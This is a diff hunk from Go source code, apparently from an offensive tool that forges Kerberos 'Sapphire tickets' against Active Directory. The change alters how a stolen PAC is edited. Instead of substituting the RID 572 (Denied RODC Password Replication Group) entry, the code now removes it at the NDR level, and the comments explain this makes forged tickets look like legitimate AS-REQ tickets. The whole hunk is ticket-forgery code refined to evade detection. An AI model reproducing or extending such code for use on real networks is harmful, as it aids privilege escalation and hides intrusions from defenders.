@@ -557,16 +557,19 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 		}
 	}
 
-	// Step 3.805: Optionally substitute RID 572 → RID 513 (Domain Users) in
-	// LOGON_INFO.GroupIds. S4U2Self PACs include RID 572 via transitive group
-	// resolution; legit AS-REQ PACs don't. True removal needs NDR edits; we
-	// substitute to preserve validity.
+	// Step 3.805: Optionally remove the RID 572 (Denied RODC Password
+	// Replication Group) entry from LOGON_INFO.GroupIds via proper NDR-level
+	// removal (decrement GroupCount + MaxCount, delete the 8-byte entry,
+	// shrink LOGON_INFO body and buffer sizes, shift subsequent PAC offsets).
+	// S4U2Self PACs include RID 572 via transitive resolution; legit AS-REQ
+	// PACs don't.
 	if req.StripExtraGroups {
-		fmt.Println("[*] Step 3.805: Substituting RID 572 → RID 513 (Domain Users)...")
+		fmt.Println("[*] Step 3.805: NDR-removing RID 572 (Denied RODC Password Replication Group) from GroupIds...")
+		preLen := len(stolenPAC)
 		var n int
 		stolenPAC, n = pac.StripDeniedRODCGroup(stolenPAC)
 		if n > 0 {
-			fmt.Printf("[+] Substituted %d group entry/entries\n", n)
+			fmt.Printf("[+] Removed RID 572 entry (PAC size %d → %d)\n", preLen, len(stolenPAC))
 		} else {
 			fmt.Println("[!] No RID 572 group entry found in LOGON_INFO")
 		}
